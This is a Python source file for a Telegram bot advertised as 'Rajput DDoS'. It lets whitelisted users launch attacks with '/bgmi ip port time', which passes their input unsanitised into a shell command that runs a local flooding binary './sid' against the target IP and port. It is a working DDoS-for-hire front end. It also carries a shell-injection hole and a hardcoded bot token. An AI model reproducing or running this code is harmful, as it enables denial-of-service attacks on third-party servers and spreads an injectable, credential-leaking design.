import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7509113069:AAEomwzwLl6rsN-YfI8b-dN0jRRSsHf7hZs'
ADMIN_USER_ID = 1821595166
USERS_FILE = 'users.txt'

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 Rajput  𝗗𝗱𝗼𝘀*\n"
        "*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJPUTDDOS*\n"
        "*🔥 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 https://t.me/RAJPUTDDOS1*\n"    
        "*🔥 𝗨𝘀𝗲 /bgmi 𝗙𝗼𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗗𝗱𝗼𝘀*"                     
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗙𝗼𝗿 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗗𝗠 » @RAJPUTDDOS*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*👤 𝗨𝗦𝗘𝗦𝗘 » /manage add 12345678 𝗙𝗼𝗿 𝗔𝗱𝗱 𝗡𝗲𝘄 𝗨𝘀𝗲𝗿 /manage rem 12345678 𝗙𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗲 𝗢𝗹𝗱 𝗨𝘀𝗲𝗿*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗲𝗲𝗳𝘂𝗹𝗹𝘆*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗦𝘂𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, time, context):

    try:
        process = await asyncio.create_subprocess_shell(
            f"./sid {ip} {port} {time} 900",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*💩 𝗘𝗿𝗿𝗼𝗿 𝗗𝘂𝗿𝗶𝗻𝗴 𝗧𝗵𝗶𝘀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 » {str(e)}*", parse_mode='Markdown')
        
        

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗔𝗧𝗘𝗗 ✅*\n*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJPUTDDOS*\n*🔥 𝗖𝗵𝗮𝗻𝗲𝗹 https://t.me/RAJPUTDDOS1*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*🤡 𝗬𝗼𝘂 𝗡𝗲𝗲𝗱 𝗧𝗼 𝗚𝗲𝘁 𝗣𝗲𝗿𝗺𝗶𝘀𝘀𝗼𝗻 𝗧𝗼 𝗨𝘀𝗲 𝗕𝗼𝘁 𝗗𝗠 » @RAJPUTDDOS*", parse_mode='Markdown')
        return    

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*🌟 𝗨𝘀𝗲𝘀 » /bgmi ip port time*", parse_mode='Markdown')
        return

    ip, port, time = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗢𝗨𝗡𝗖𝗛𝗘𝗗 ✅*\n"
        f"*⭐ 𝗧𝗮𝗿𝗴𝗲𝘁 » {ip}*\n"
        f"*⭐ 𝗣𝗼𝗿𝘁 » {port}*\n"
        f"*⭐ 𝗧𝗶𝗺𝗲 » {time} seconds*\n"
        f"*🔥 𝗢𝘄𝗻𝗲𝗿 @RAJPUTDDOS*\n"        
        f"*🔥 𝗖𝗵𝗮𝗻𝗲𝗹 = https://t.me/RAJPUTDDOS1*"        
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, time, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("bgmi", attack))
    application.run_polling()

if __name__ == '__main__':
    main()
